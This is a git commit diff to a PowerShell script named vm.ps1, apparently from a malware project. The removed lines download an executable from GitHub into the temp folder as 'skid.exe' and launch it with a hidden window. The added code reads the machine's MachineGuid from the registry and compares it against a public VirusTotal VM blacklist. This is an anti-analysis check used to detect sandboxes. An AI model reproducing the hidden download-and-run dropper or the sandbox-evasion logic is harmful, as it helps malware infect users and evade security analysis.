e4de8d984bd4547d5ed570780bb2c472f0f46269
43a1723 <hai1723notgay@gmail.com>
2024-06-14 08:22:20 +0700

    Update vm.ps1

--- vm.ps1
+++ vm.ps1
@@ -1,2 +1,22 @@
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/LMAO_protected.exe" -OutFile "$temp\skid.exe"
-Start-Process -FilePath "$temp\skid.exe" -WindowStyle Hidden
+# Lấy giá trị MachineGuid từ Registry
+$machineGuid = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name "MachineGuid").MachineGuid
+
+# URL của file MachineGuid.txt
+$url = "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt"
+
+# Tải nội dung của file MachineGuid.txt
+try {
+    $remoteContent = Invoke-WebRequest -Uri $url -UseBasicParsing
+    $machineGuids = $remoteContent.Content -split "`n" -replace "`r",""
+} catch {
+    Write-Host "Không thể tải tệp từ URL. Kiểm tra kết nối mạng và URL."
+    exit
+}
+
+# Kiểm tra xem MachineGuid có trong danh sách không
+if ($machineGuids -contains $machineGuid) {
+    Write-Host "MachineGuid có trong danh sách đen."
+} else {
+    Write-Host "MachineGuid không có trong danh sách đen."
+}
+
